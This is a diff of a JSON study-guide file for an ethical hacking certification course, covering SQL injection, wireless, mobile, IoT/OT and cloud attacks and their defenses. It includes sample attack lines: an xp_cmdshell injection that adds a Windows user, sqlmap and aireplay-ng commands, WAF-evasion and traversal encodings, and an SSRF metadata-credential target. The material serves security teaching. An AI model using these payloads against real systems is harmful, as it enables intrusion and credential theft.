-          "content": "<p>Advanced SQLi techniques extend beyond simple data extraction:</p><ul><li><strong>Second-Order SQL Injection:</strong> Also known as stored SQLi, the malicious payload is stored safely in the database during the initial request (passing entry validation). The payload is triggered later when a different application function retrieves the stored data and uses it in a new SQL query without parameterization. It is particularly dangerous because it bypasses initial input validation.</li><li><strong>OS Command Execution:</strong> Attackers can escalate SQL injection to operating system-level access. In Microsoft SQL Server, the <strong><code>xp_cmdshell</code></strong> extended stored procedure allows executing OS commands. An attacker can inject <code>'; EXEC xp_cmdshell 'net user hacker P@ss123 /add' --</code> to create a new Windows user account on the database server.</li><li><strong>WAF Evasion:</strong> When standard SQL keywords (like UNION or SELECT) are blocked by a Web Application Firewall (WAF), attackers use advanced evasion techniques. These include <strong>case variation</strong> (<code>SeLeCt</code>), <strong>inline comments</strong> to break up words (<code>SEL/**/ECT</code>), or URL/hex encoding. These exploit parsing differences between the WAF and the backend database.</li><li><strong>SQLMap Automation:</strong> Attackers use tools like <code>sqlmap</code> to automate SQLi testing. For example, the command <code>sqlmap -u 'http://target.com/page?id=1' --dbs --batch</code> tests the 'id' parameter for vulnerabilities and attempts to enumerate all database names non-interactively.</li></ul>",
+          "title": "Advanced SQL Injection, OOB, and Automation",
+          "content": "<p>Advanced SQLi techniques extend capabilities beyond basic extraction:</p><ul><li><strong>Out-of-Band (OOB) SQLi:</strong> Used when direct responses are absent and time delays are impractical. The attacker forces the database server to initiate an external network connection (e.g., DNS resolution or HTTP request) to a server they control, embedding the stolen data in the request. In MSSQL, <code>xp_dirtree</code> can trigger SMB or DNS requests.</li><li><strong>Second-Order (Stored) SQLi:</strong> The malicious payload is submitted safely into the database during the initial request (bypassing input validation). It is triggered later when another application function retrieves the stored data and executes it within a new, unparameterized SQL query.</li><li><strong>OS Command Execution:</strong> Attackers can escalate SQL injection to operating system-level access. In Microsoft SQL Server, the <strong><code>xp_cmdshell</code></strong> extended stored procedure allows executing OS commands. An attacker can inject <code>'; EXEC xp_cmdshell 'net user hacker P@ss123 /add' --</code> to create a new Windows user account. In MySQL, attackers might use <code>INTO OUTFILE</code> to write a PHP web shell to the web root.</li><li><strong>WAF Evasion:</strong> When standard SQL keywords are blocked by a WAF, attackers use evasion. Techniques include <strong>case variation</strong> (<code>uNiOn SeLeCt</code>), <strong>inline comments</strong> to break up words (<code>SEL/**/ECT</code> or <code>/*!SELECT*/</code>), URL/hex/Unicode encoding, or replacing spaces with tabs or newlines.</li><li><strong>SQLMap Automation:</strong> <code>sqlmap</code> automates SQLi discovery and exploitation. For example, <code>sqlmap -u 'http://target.com/page?id=1' --dbs --batch</code> tests the 'id' parameter and enumerates all databases non-interactively. Flags like <code>--os-shell</code> attempt to gain a command prompt.</li></ul>",
           "keyTerms": [
+            "Out-of-Band SQLi",
             "Second-Order SQLi",
-            "Stored SQLi",
             "xp_cmdshell",
-            "OS Command Execution",
+            "INTO OUTFILE",
             "WAF Evasion",
-            "SQLMap"
+            "SQLMap Automation",
+            "Stacked Queries"
           ]
         },
         {
           "title": "SQL Injection Countermeasures",
-          "content": "<p><strong>Parameterized queries (prepared statements) with bound parameters</strong> are the <strong>most effective defense</strong> against all forms of SQL injection. Parameterization completely separates the SQL code structure from the user-supplied data. The database engine treats user input strictly as literal data, never as executable SQL code, regardless of the characters contained in the input.</p><p>While Web Application Firewalls (WAFs) and input filtering (like stripping single quotes) provide defense-in-depth, they are secondary controls that can often be bypassed by skilled attackers using obfuscation and encoding techniques.</p>",
+          "content": "<p>Defense requires secure coding practices at the application layer:</p><ul><li><strong>Parameterized Queries (Prepared Statements):</strong> This is the <strong>most effective, primary defense</strong> against all forms of SQL injection. Parameterization completely separates the SQL code structure from the user-supplied data. The database engine treats user input strictly as literal string or integer data, never interpreting it as executable SQL code, regardless of special characters (like quotes or semicolons) contained in the input.</li><li><strong>Stored Procedures:</strong> When properly parameterized, stored procedures provide a similar level of protection to prepared statements, while encapsulating queries on the database side.</li><li><strong>Input Validation and Escaping:</strong> Validate input against strict allow-lists (type, length, format). Escaping characters (like doubling single quotes) is a weaker, secondary defense and prone to bypasses.</li><li><strong>Least Privilege:</strong> Ensure the database account used by the web application has the absolute minimum permissions required. Do not use the `sa` or `root` accounts. Revoke access to dangerous stored procedures like `xp_cmdshell`.</li></ul>",
           "keyTerms": [
             "Parameterized Queries",
             "Prepared Statements",
+            "Stored Procedures",
             "Input Validation",
-            "WAF Evasion"
+            "Least Privilege",
+            "Defense-in-Depth"
           ]
         }
       ],
       "tools": [
         "SQLMap",
         "Havij",
-        "Burp Suite"
+        "Burp Suite",
+        "jSQL Injection",
+        "BBQSQL",
+        "SQLninja"
       ],
       "v13Updates": [
-        "NoSQL injection techniques",
-        "GraphQL injection attacks",
-        "AI-assisted SQLi payload generation"
+        "NoSQL injection techniques (MongoDB, CouchDB)",
+        "GraphQL injection attacks and introspection",
+        "AI-assisted SQLi payload generation and evasion"
       ]
     },
     {
@@ -1259,75 +1337,74 @@
       "topics": [
         {
           "title": "Wireless Standards and Encryption",
-          "content": "<p>IEEE 802.11 standards define wireless networking: 802.11a (5GHz, 54Mbps), 802.11b (2.4GHz, 11Mbps), 802.11g (2.4GHz, 54Mbps), 802.11n (Wi-Fi 4, dual-band, 600Mbps), 802.11ac (Wi-Fi 5, 5GHz, multi-Gbps), and 802.11ax (Wi-Fi 6/6E).</p><ul><li><strong>WEP:</strong> Uses RC4 with a 24-bit IV (broken).</li><li><strong>WPA:</strong> Uses TKIP (improved but deprecated).</li><li><strong>WPA2:</strong> Uses <strong>AES-CCMP</strong> (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol) as its mandatory encryption standard. It provides both data confidentiality (via AES in counter mode) and data integrity (via CBC-MAC).</li><li><strong>WPA3:</strong> Replaces WPA2's Pre-Shared Key (PSK) with <strong>Simultaneous Authentication of Equals (SAE)</strong>, also known as the Dragonfly handshake. SAE is a zero-knowledge proof protocol providing forward secrecy and protecting against offline dictionary attacks because each handshake requires live interaction with the access point.</li></ul>",
+          "content": "<p>IEEE 802.11 standards define wireless networking, including newer iterations like <strong>802.11ax (Wi-Fi 6)</strong>, which provides better efficiency and capacity. Earlier standards include 802.11a/b/g/n/ac.</p><ul><li><strong>WEP:</strong> An obsolete standard that uses RC4 and is highly vulnerable to IV reuse attacks.</li><li><strong>WPA:</strong> Introduced the <strong>Temporal Key Integrity Protocol (TKIP)</strong> to provide per-packet key mixing, fixing WEP's immediate flaws while remaining compatible with legacy hardware.</li><li><strong>WPA2:</strong> Mandates the use of <strong>AES-CCMP</strong> (Advanced Encryption Standard - Counter Mode with CBC-MAC Protocol), which provides robust confidentiality via AES and integrity via CBC-MAC.</li><li><strong>WPA3:</strong> Replaces WPA2's Pre-Shared Key (PSK) with <strong>Simultaneous Authentication of Equals (SAE)</strong>, a zero-knowledge proof protocol (Dragonfly handshake) that protects against offline dictionary attacks.</li></ul>",
           "keyTerms": [
-            "802.11",
+            "802.11ax",
+            "Wi-Fi 6",
             "WEP",
             "WPA",
             "WPA2",
             "WPA3",
             "AES-CCMP",
             "TKIP",
-            "SAE",
-            "RC4",
-            "Wi-Fi 6"
+            "SAE"
           ]
         },
         {
           "title": "Wireless Attack Techniques and Vulnerabilities",
-          "content": "<p>Wireless attacks exploit protocol weaknesses and misconfigurations.</p><ul><li><strong>WPA2 Handshake Cracking:</strong> Attackers capture the 4-way handshake and perform offline dictionary or brute-force attacks using tools like Aircrack-ng or Hashcat. The handshake itself doesn't contain the password but has enough data to verify guesses offline.</li><li><strong>Deauthentication Attacks:</strong> Attackers can force clients to disconnect using tools like <code>aireplay-ng</code>. For example, <code>aireplay-ng -0 5 -a [BSSID] -c [Client MAC]</code> sends 5 deauth frames to force a client to reconnect, allowing the attacker to capture the handshake.</li><li><strong>KRACK (Key Reinstallation Attack):</strong> Exploits a flaw in the WPA2 4-way handshake by manipulating and replaying messages to force reinstallation of an already-in-use encryption key. This resets the nonce, allowing attackers to replay, decrypt, and forge packets.</li><li><strong>WPS Flaws:</strong> Wi-Fi Protected Setup (WPS) uses an 8-digit PIN validated in two halves, reducing the brute-force space to ~11,000 combinations. Tools like Reaver or Bully exploit this to recover the WPA/WPA2 passphrase.</li></ul>",
+          "content": "<p>Wireless networks are susceptible to numerous attacks targeting their protocols and configurations.</p><ul><li><strong>WPA2 Handshake Cracking:</strong> Attackers capture the 4-way handshake and perform offline dictionary or brute-force attacks using tools like Aircrack-ng or Hashcat. The handshake itself doesn't contain the password but has enough data to verify guesses offline.</li><li><strong>Deauthentication Attacks:</strong> Attackers send spoofed management frames from the AP to force clients to disconnect. Using tools like <code>aireplay-ng -0 5 -a [BSSID] -c [Client MAC]</code> sends 5 deauth frames, often used to capture a handshake upon reconnection.</li><li><strong>KRACK (Key Reinstallation Attack):</strong> Exploits a flaw in the WPA2 4-way handshake by manipulating and replaying messages to force reinstallation of an already-in-use encryption key, enabling traffic decryption.</li><li><strong>WPS Flaws:</strong> Wi-Fi Protected Setup (WPS) uses an 8-digit PIN validated in two halves. Tools like <strong>Reaver</strong> or Bully exploit this to recover the WPA/WPA2 passphrase via brute-force.</li><li><strong>MAC Spoofing:</strong> Changing a wireless card's MAC address to match an authorized client to bypass MAC filtering or captive portals.</li></ul>",
           "keyTerms": [
-            "4-Way Handshake",
-            "Deauthentication",
+            "Deauthentication Attack",
             "KRACK",
-            "PMKID",
-            "WPS PIN",
-            "Handshake Capture",
-            "Offline Dictionary Attack",
+            "Reaver",
+            "MAC Spoofing",
             "aireplay-ng"
           ]
         },
         {
           "title": "Evil Twin and Rogue Access Points",
-          "content": "<p>An <strong>Evil Twin</strong> attack involves setting up a malicious access point with the same SSID as a legitimate network, often with a stronger signal, tricking users into connecting. Once connected, the attacker intercepts all traffic, capturing credentials and performing Man-in-the-Middle (MitM) attacks.</p><p>This is often combined with a <strong>Captive Portal Phishing</strong> attack, where the attacker presents a fake corporate login page to steal credentials. Enterprise WPA2 attacks targeting PEAP-MSCHAPv2 use an evil twin and a rogue RADIUS server to capture MSCHAPv2 challenge-response hashes, which are then cracked offline (e.g., using asleap or hashcat). Proper certificate validation on the client side mitigates this.</p>",
+          "content": "<p>An <strong>Evil Twin</strong> attack involves setting up a malicious rogue access point with the same SSID as a legitimate network, often with a stronger signal, tricking users into connecting to intercept their traffic.</p><p>This is frequently combined with <strong>Captive Portal Phishing</strong>, presenting a fake login page to steal credentials. In enterprise environments using PEAP-MSCHAPv2, an attacker can set up a rogue RADIUS server and an evil twin to capture MSCHAPv2 challenge-response hashes, which are then cracked offline using tools like asleap or hashcat.</p>",
           "keyTerms": [
             "Evil Twin",
             "Rogue AP",
             "Captive Portal",
-            "hostapd",
-            "Fluxion",
-            "SSID Spoofing",
-            "KARMA Attack",
+            "PEAP-MSCHAPv2",
             "Rogue RADIUS"
           ]
         },
         {
-          "title": "Bluetooth Hacking",
-          "content": "<p>Bluetooth attacks exploit short-range wireless communication:</p><ul><li><strong>Bluejacking:</strong> Sending unsolicited messages or business cards (vCards) to nearby Bluetooth devices. It is mostly a nuisance but shows the device is discoverable.</li><li><strong>Bluesnarfing:</strong> Unauthorized data extraction (contacts, messages, files) from vulnerable devices.</li><li><strong>Bluebugging:</strong> Taking full control of a device to make calls, send messages, and access the internet.</li><li><strong>BlueBorne:</strong> A set of vulnerabilities allowing remote code execution without pairing.</li><li><strong>KNOB:</strong> Key Negotiation of Bluetooth, forcing weak encryption keys.</li></ul>",
+          "title": "Bluetooth and RFID Hacking",
+          "content": "<p>Wireless attacks extend beyond Wi-Fi to other short-range protocols:</p><ul><li><strong>Bluejacking:</strong> Sending unsolicited messages or vCards to nearby Bluetooth devices (mostly a nuisance).</li><li><strong>Bluesnarfing:</strong> Unauthorized extraction of data (contacts, messages) from a Bluetooth device.</li><li><strong>Bluebugging:</strong> Exploiting vulnerabilities to gain full backdoor control of a device to make calls, send texts, and listen to conversations.</li><li><strong>RFID Cloning:</strong> Attackers use devices like the Proxmark3 to clone Radio Frequency Identification (RFID) badges, gaining unauthorized physical access to secure buildings.</li></ul>",
           "keyTerms": [
             "Bluejacking",
             "Bluesnarfing",
             "Bluebugging",
-            "BlueBorne",
-            "KNOB",
-            "Bluetooth Pairing",
-            "BLE"
+            "RFID",
+            "Proxmark3"
+          ]
+        },
+        {
+          "title": "Reconnaissance and Tooling",
+          "content": "<p>Gathering intelligence on wireless networks is a critical first step.</p><ul><li><strong>Wardriving:</strong> The act of searching for Wi-Fi networks by a person in a moving vehicle using a portable computer or smartphone.</li><li><strong>Kismet:</strong> A widely used passive 802.11 layer2 wireless network detector, sniffer, and WIDS. Because it operates passively, it is undetectable.</li><li><strong>SSID Hiding:</strong> Disabling SSID broadcasting is merely <em>security through obscurity</em>. The SSID is still transmitted in plaintext within client probe requests and responses.</li><li><strong>Antennas:</strong> Using a <strong>Yagi antenna</strong> allows attackers to focus a wireless signal in a highly directional manner to achieve greater range and precision.</li></ul>",
+          "keyTerms": [
+            "Wardriving",
+            "Kismet",
+            "SSID Hiding",
+            "Yagi Antenna"
           ]
         }
       ],
       "tools": [
         "Aircrack-ng",
-        "Airmon-ng",
         "Aireplay-ng",
-        "Airodump-ng",
-        "Wifite",
         "Hashcat",
-        "Fluxion",
-        "Kismet"
+        "Reaver",
+        "Kismet",
+        "Proxmark3"
       ],
       "v13Updates": [
-        "WPA3-SAE Dragonfly handshake analysis",
-        "Wi-Fi 6E security implications"
+        "Wi-Fi 6 (802.11ax) standards",
+        "WPA3 SAE deep dive"
       ]
     },
     {
@@ -1335,44 +1412,39 @@
       "title": "Hacking Mobile Platforms",
       "domainId": 7,
       "icon": "smartphone",
-      "description": "Explores Android and iOS security architectures, mobile attack vectors, OWASP Mobile Top 10 vulnerabilities, and mobile device management bypass techniques.",
+      "description": "Explores Android and iOS security architectures, mobile attack vectors, OWASP Mobile Top 10 vulnerabilities, MDM bypass techniques, and techniques for evading IDS and firewalls.",
       "objectives": [
         "Understand Android and iOS security architectures",
         "Identify OWASP Mobile Top 10 vulnerabilities",
         "Perform jailbreaking and rooting for security testing",
         "Analyze mobile applications for security weaknesses",
-        "Implement mobile security countermeasures and MDM solutions"
+        "Implement techniques for evading IDS, firewalls, and honeypots"
       ],
       "topics": [
         {
           "title": "Mobile Platform Architecture & Sandboxing",
-          "content": "<p>Mobile platforms use sandboxing to protect user data. <strong>Android Application Sandbox</strong> leverages Linux's user-based protection model. Each app runs as a separate Linux user with a unique UID in its own process, preventing apps from accessing each other's data, memory, and resources by default.</p><p>Android APKs must be digitally signed to verify the developer's identity and ensure code integrity. Unsigned APKs cannot be installed without the user explicitly enabling 'Install from Unknown Sources' or using ADB.</p>",
+          "content": "<p>Mobile operating systems use sandboxing to isolate applications and protect user data. The <strong>Android Application Sandbox</strong> leverages Linux's user-based protection model. Each app runs as a separate Linux user with a unique UID, preventing apps from accessing each other's data by default.</p><p>Android APKs must be digitally signed to verify the developer's identity and ensure code integrity. Unsigned APKs cannot be installed without the user explicitly enabling <em>Install from Unknown Sources</em> or using ADB, creating an attack vector for social engineering.</p>",
           "keyTerms": [
             "Android Sandbox",
-            "APK",
-            "DEX",
-            "iOS Sandbox",
-            "Code Signing",
-            "Secure Enclave",
-            "App Permissions"
+            "UID",
+            "APK Signing",
+            "Unknown Sources"
           ]
         },
         {
           "title": "Rooting, Jailbreaking, and MDM Bypass",
-          "content": "<p><strong>Rooting</strong> (Android) and <strong>Jailbreaking</strong> (iOS) achieve similar goals: bypassing manufacturer restrictions and gaining elevated (root/admin) privileges. This process disables critical OS security controls like application sandboxing, mandatory code signing, and app store restrictions.</p><p>When an enterprise <strong>Mobile Device Management (MDM)</strong> solution is bypassed via jailbreaking tools (e.g., unc0ver), it exposes corporate data to unauthorized access and malware, creating a severe data exfiltration risk. This requires immediate incident response.</p>",
+          "content": "<p><strong>Rooting</strong> (Android) and <strong>Jailbreaking</strong> (iOS) achieve the same goal: gaining elevated (root/admin) privileges and bypassing manufacturer restrictions. This disables critical OS security controls like application sandboxing and mandatory code signing.</p><p>When an enterprise <strong>Mobile Device Management (MDM)</strong> solution is bypassed via jailbreaking (using tools like unc0ver), corporate data is exposed to unauthorized access and malware, presenting a severe data exfiltration risk that requires immediate incident response.</p>",
           "keyTerms": [
-            "Jailbreaking",
             "Rooting",
+            "Jailbreaking",
             "MDM Bypass",
-            "unc0ver",
-            "Side-loading"
+            "unc0ver"
           ]
         },
         {
           "title": "OWASP Mobile Top 10 & App Vulnerabilities",
-          "content": "<p>The OWASP Mobile Top 10 (2024) identifies critical risks. <strong>M1: Improper Credential Usage</strong> is the #1 risk, encompassing hardcoded credentials, insecure API keys, and insecure credential transmission.</p><p>Another major risk is <strong>Insecure Data Storage</strong>. For example, Android SharedPreferences files are stored as unencrypted XML files in <code>/data/data/&lt;package_name&gt;/shared_prefs/</code>. With root access, an attacker can easily read these files and extract sensitive data.</p><p>Without <strong>Certificate Pinning</strong>, an app trusts any certificate signed by a trusted CA. An attacker who installs a rogue CA certificate on the device can perform Man-in-the-Middle (MitM) attacks on HTTPS traffic. Pinning ensures the app only trusts specific certificates or public keys.</p>",
+          "content": "<p>The OWASP Mobile Top 10 highlights critical mobile risks:</p><ul><li><strong>M1: Improper Credential Usage:</strong> The #1 risk, encompassing hardcoded credentials, insecure API keys, and insecure credential transmission.</li><li><strong>Insecure Data Storage:</strong> For example, Android SharedPreferences stored as unencrypted XML files in <code>/data/data/&lt;package_name&gt;/shared_prefs/</code> can be read by any attacker with root access.</li><li><strong>Lack of Certificate Pinning:</strong> Without certificate pinning, an app trusts any certificate signed by a trusted CA. This allows attackers who install a rogue CA certificate on a device to perform Man-in-the-Middle (MitM) attacks on HTTPS traffic.</li></ul>",
           "keyTerms": [
-            "Mobile Top 10",
             "Improper Credential Usage",
             "Insecure Data Storage",
             "Certificate Pinning",
@@ -1381,30 +1453,39 @@
         },
         {
           "title": "Mobile Attack Vectors & Dynamic Instrumentation",
-          "content": "<p>Mobile malware often disguises itself as benign apps (e.g., a flashlight app) but requests excessive and unnecessary permissions like READ_SMS, READ_CONTACTS, RECORD_AUDIO, ACCESS_FINE_LOCATION, and CAMERA, acting as spyware or a Trojan.</p><p>Advanced Android malware evades static analysis and app store scanners using <strong>Dynamic Code Loading</strong>. Tools like <code>DexClassLoader</code> can load a secondary DEX file from a remote server at runtime. Since the malicious payload isn't in the original APK, it bypasses pre-installation checks.</p><p>Security researchers use tools like <strong>Frida</strong> for dynamic instrumentation. Frida injects JavaScript into running processes, allowing runtime modification of app behavior, method hooking, and bypassing security controls like root detection and SSL pinning.</p>",
+          "content": "<p>Mobile malware often disguises itself as benign apps (e.g., a flashlight app) but requests excessive and unnecessary permissions like READ_SMS, CAMERA, and ACCESS_FINE_LOCATION, functioning as Spyware or a Trojan.</p><p>Advanced malware evades static analysis using <strong>Dynamic Code Loading</strong>. By using <code>DexClassLoader</code>, an app can load a secondary malicious DEX file from a remote server at runtime, bypassing app store scanners.</p><p>Security researchers use tools like <strong>Frida</strong> for dynamic instrumentation. It injects JavaScript into running processes, allowing runtime modification, method hooking, and bypassing security controls like root detection and SSL pinning.</p>",
           "keyTerms": [
-            "Frida",
-            "DexClassLoader",
-            "Dynamic Code Loading",
             "Spyware",
             "Trojan",
-            "Method Hooking"
+            "DexClassLoader",
+            "Dynamic Code Loading",
+            "Frida"
+          ]
+        },
+        {
+          "title": "Evading IDS, Firewalls, and Honeypots",
+          "content": "<p>Attackers use various techniques to bypass network defenses:</p><ul><li><strong>Decoy Scanning:</strong> Using Nmap's <code>-D</code> flag sends spoofed source IPs alongside the attacker's real IP to confuse Intrusion Detection Systems (IDS).</li><li><strong>Firewalking:</strong> Manipulating IP TTL values in a traceroute-like fashion to map out firewall ACLs and discover open ports.</li><li><strong>Packet Fragmentation:</strong> Splitting payloads into smaller fragments to evade IDS signature matching, hoping the IDS fails to reassemble them correctly.</li><li><strong>Source Routing:</strong> Allowing the sender to specify the exact route a packet takes, potentially bypassing security devices.</li><li><strong>Obfuscation:</strong> Masking payloads using URL encoding (e.g., <code>%2e%2e%2f</code>) or hex encoding to evade string signatures.</li><li><strong>TCP Chaffing (Insertion):</strong> Sending garbage packets with fake TTLs or bad checksums that the IDS processes but the target host drops.</li><li><strong>Slow Port Scans:</strong> Evading time-based IDS thresholds by sending packets very slowly (e.g., one every 5 minutes).</li><li><strong>Snort Rules:</strong> Consist of a Rule Header (action, protocol, IPs, ports) and Rule Options (signatures and alerts).</li><li><strong>Honeypots:</strong> Low-interaction honeypots simulate services, while high-interaction honeypots run actual vulnerable operating systems for detailed behavioral analysis.</li><li><strong>Screened Subnet:</strong> A firewall architecture utilizing two firewalls to create a DMZ separating the internal network from the internet.</li></ul>",
+          "keyTerms": [
+            "Decoy Scanning",
+            "Firewalking",
+            "Fragmentation",
+            "TCP Chaffing",
+            "Obfuscation",
+            "Snort Rules",
+            "Screened Subnet",
+            "Source Routing"
           ]
         }
       ],
       "tools": [
         "Frida",
-        "jadx",
-        "MobSF",
-        "Drozer",
-        "Objection",
-        "Hopper",
-        "Cydia",
-        "Magisk"
+        "DexClassLoader",
+        "Nmap",
+        "Snort"
       ],
       "v13Updates": [
-        "Mobile AI-based threat detection",
-        "5G mobile security considerations"
+        "OWASP Mobile Top 10 (2024)",
+        "Advanced IDS Evasion Techniques"
       ]
     },
     {
@@ -1412,218 +1493,224 @@
       "title": "IoT and OT Hacking",
       "domainId": 7,
       "icon": "cpu",
-      "description": "Covers Internet of Things architecture and protocols, OT/SCADA/ICS security concepts, IoT attack surfaces, and the unique security challenges of operational technology environments.",
+      "description": "Covers Internet of Things architecture and protocols, OT/SCADA security concepts, IoT attack surfaces, and core Cloud Computing security principles.",
       "objectives": [
         "Understand IoT architecture, protocols, and communication standards",
         "Identify IoT attack surfaces and common vulnerabilities",
-        "Explain OT/SCADA/ICS concepts and attack vectors",
-        "Perform IoT device security assessment",
-        "Implement IoT and OT security best practices"
+        "Explain OT/SCADA concepts and attack vectors",
+        "Understand Cloud computing service models and shared responsibility",
+        "Identify Cloud-specific threats and serverless security risks"
       ],
       "topics": [
         {
-          "title": "IoT Protocols: MQTT, CoAP, and Zigbee",
-          "content": "<p>IoT utilizes protocols tailored for constrained environments:</p><ul><li><strong>MQTT (Message Queuing Telemetry Transport):</strong> A lightweight publish-subscribe messaging protocol. Devices publish messages to topics, and a central broker manages distribution. Subscribing to the wildcard topic <code>'#'</code> matches all topics; if a broker lacks ACLs, an attacker can access all sensor data, commands, and credentials.</li><li><strong>CoAP (Constrained Application Protocol):</strong> A lightweight, UDP-based RESTful protocol designed for constrained devices, reducing overhead compared to TCP-based HTTP.</li><li><strong>Zigbee:</strong> An IEEE 802.15.4-based wireless protocol for low-power, short-range mesh networking, common in smart home automation and industrial sensors.</li></ul>",
+          "title": "IoT Protocols and Architecture",
+          "content": "<p>IoT uses lightweight protocols for constrained environments:</p><ul><li><strong>MQTT:</strong> A lightweight publish-subscribe messaging protocol. If a broker lacks proper ACLs, subscribing to the wildcard topic <code>\"#\"</code> allows an attacker to receive all messages, exposing sensor data, commands, and credentials.</li><li><strong>CoAP:</strong> A lightweight UDP-based RESTful protocol using less overhead than HTTP, ideal for constrained devices.</li><li><strong>Zigbee:</strong> A low-power, short-range wireless mesh networking protocol (IEEE 802.15.4) commonly used in smart homes.</li></ul>",
           "keyTerms": [
             "MQTT",
             "CoAP",
             "Zigbee",
-            "Publish-Subscribe",
             "Wildcard Topic"
           ]
         },
         {
           "title": "IoT Attack Surface and Vulnerabilities",
-          "content": "<p>A critical and widespread vulnerability in IoT is the use of <strong>default or hardcoded credentials</strong> (e.g., admin/admin), which the Mirai botnet heavily exploited.</p><p>Another major issue is the lack of proper cryptography. For example, a smart lock communicating over unencrypted HTTP and accepting unsigned firmware updates is highly vulnerable to MitM traffic interception and malicious firmware injection.</p><p>Furthermore, if an IoT manufacturer embeds the <strong>same private RSA key</strong> in the firmware of all devices of a specific model, extracting the key from one device compromises the encrypted communications of all devices in that product line.</p>",
+          "content": "<p>A major vulnerability in IoT is the use of <strong>default or hardcoded credentials</strong> (e.g., admin/admin), which the Mirai botnet heavily exploited to compromise millions of devices.</p><p>Other issues include unencrypted HTTP communications and a lack of digital signature verification for firmware updates, which allow Man-in-the-Middle (MitM) attacks and malicious firmware injection. Furthermore, manufacturers sometimes embed the same private RSA key across all devices of a single model; extracting it from one device compromises the entire product line.</p>",
           "keyTerms": [
             "Default Credentials",
             "Firmware Injection",
-            "Hardcoded Keys",
-            "MitM"
+            "Shared RSA Keys",
+            "Mirai Botnet"
           ]
         },
         {
           "title": "OT/SCADA Security and Protocols",
-          "content": "<p><strong>SCADA (Supervisory Control and Data Acquisition)</strong> systems monitor and control industrial processes. They are high-value targets because compromising them can cause severe physical damage to critical infrastructure.</p><p>OT protocols often lack security. <strong>Modbus TCP</strong>, for instance, has no built-in authentication or encryption. Any device on the network can read and write PLC registers without credentials, allowing attackers to send crafted packets that modify critical processes (e.g., chemical dosing in a water plant).</p>",
+          "content": "<p><strong>SCADA (Supervisory Control and Data Acquisition)</strong> systems monitor and control industrial processes. They are high-value targets because compromising them can cause severe physical damage. A <strong>PLC (Programmable Logic Controller)</strong> directly reads sensors and operates machinery.</p><p>OT protocols often lack modern security. <strong>Modbus TCP</strong> operates without authentication or encryption, meaning any device on the network can read and write PLC registers. To protect OT environments, organizations use the <strong>Purdue Model</strong>, a hierarchical network segmentation framework that isolates critical OT zones from IT networks.</p>",
           "keyTerms": [
             "SCADA",
-            "ICS",
             "PLC",
             "Modbus TCP",
-            "Physical Damage"
+            "Purdue Model"
           ]
         },
         {
-          "title": "The Purdue Model for ICS/SCADA",
-          "content": "<p>To protect OT environments from IT network threats, organizations use the <strong>Purdue Model</strong> (Purdue Enterprise Reference Architecture). It is a hierarchical network segmentation model that defines security zones and levels (0-5) for industrial control systems, from the physical process level up to the enterprise network, ensuring proper isolation and controlled access.</p>",
+          "title": "Cloud Computing Concepts",
+          "content": "<p>Cloud computing relies on the <strong>Shared Responsibility Model</strong>. In SaaS, while the provider manages the infrastructure, the customer remains responsible for securing application data and user access. A <strong>Private Cloud</strong> is dedicated solely to a single organization.</p><ul><li><strong>PaaS (Platform as a Service):</strong> Provides developers a framework to build applications without managing the underlying OS or hardware.</li><li><strong>Container Escape:</strong> A critical threat where an attacker exploits vulnerabilities in a Docker container to break out and access the underlying host OS.</li><li><strong>Storage Misconfigurations:</strong> Leaving cloud storage buckets (like AWS S3) publicly readable is a leading cause of data breaches.</li><li><strong>Cryptojacking:</strong> Illicitly utilizing stolen cloud compute resources to mine cryptocurrency.</li><li><strong>SSRF to Metadata Service:</strong> Exploiting SSRF in a cloud VM to query <code>169.254.169.254</code> and steal temporary IAM credentials.</li><li><strong>Serverless (FaaS):</strong> The provider secures the infrastructure, but the primary risk shifts to insecure application code (e.g., injection flaws).</li><li><strong>CASB:</strong> A Cloud Access Security Broker acts as a gatekeeper enforcing security and compliance policies between consumers and providers.</li></ul>",
           "keyTerms": [
-            "Purdue Model",
-            "Network Segmentation",
-            "Security Zones"
+            "PaaS",
+            "Container Escape",
+            "Cryptojacking",
+            "SSRF",
+            "IAM",
+            "CASB",
+            "Serverless"
           ]
         }
       ],
       "tools": [
         "Shodan",
-        "Censys",
-        "Firmwalker",
-        "Binwalk",
         "MQTT Explorer",
-        "Nmap IoT scripts",
-        "Wireshark"
+        "Nmap IoT scripts"
       ],
       "v13Updates": [
-        "AI in IoT security monitoring",
-        "5G-connected IoT threats",
-        "Smart city infrastructure attacks"
+        "Cloud Service Models Integration",
+        "IoT Cryptographic Flaws"
       ]
     },
     {
       "id": 19,
-      "title": "Cloud Computing",
+      "title": "Cloud Computing and Applied Cryptography",
       "domainId": 8,
       "icon": "cloud",
-      "description": "Covers cloud computing service models, shared responsibility, cloud-specific threats and attacks, container security, serverless risks, and Zero Trust architecture for cloud environments.",
+      "description": "Covers advanced cloud security, zero trust, IAM risks, container vulnerabilities, and fundamental cryptography concepts including symmetric/asymmetric algorithms, hashing, and cryptanalysis.",
       "objectives": [
-        "Understand cloud service models (IaaS, PaaS, SaaS) and deployment types",
-        "Explain the shared responsibility model for cloud security",
-        "Identify cloud-specific threats and attack vectors",
-        "Assess container (Docker/Kubernetes) and serverless security",
-        "Implement Zero Trust architecture in cloud environments"
+        "Explain the shared responsibility model in IaaS",
+        "Assess container and serverless security configurations",
+        "Implement Zero Trust architecture and CSPM tools",
+        "Understand symmetric and asymmetric encryption principles",
+        "Identify cryptographic attacks and vulnerabilities"
       ],
       "topics": [
         {
-          "title": "Cloud Fundamentals and Shared Responsibility",
-          "content": "<p>In an <strong>IaaS (Infrastructure as a Service)</strong> deployment, the cloud provider secures the underlying hardware, hypervisor, and network. Under the <strong>shared responsibility model</strong>, the customer (tenant) is fully responsible for securing and patching the guest operating system, applications, and data.</p>",
+          "title": "Cloud Security and IAM Misconfigurations",
+          "content": "<p>In an <strong>IaaS (Infrastructure as a Service)</strong> deployment, the customer is fully responsible for patching the guest operating system, securing applications, and protecting data.</p><p>Misconfigured IAM policies, such as <code>{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}</code>, grant full administrative access, leading to total account compromise if credentials are leaked. AWS S3 buckets with <strong>public-read</strong> ACLs allow anyone on the internet to list and download all contents without authentication. To prevent SSRF attacks from stealing metadata credentials, AWS introduced IMDSv2, requiring a session token.</p>",
           "keyTerms": [
             "IaaS",
-            "Shared Responsibility Model",
-            "Guest OS"
-          ]
-        },
-        {
-          "title": "Cloud Threats and IAM Misconfigurations",
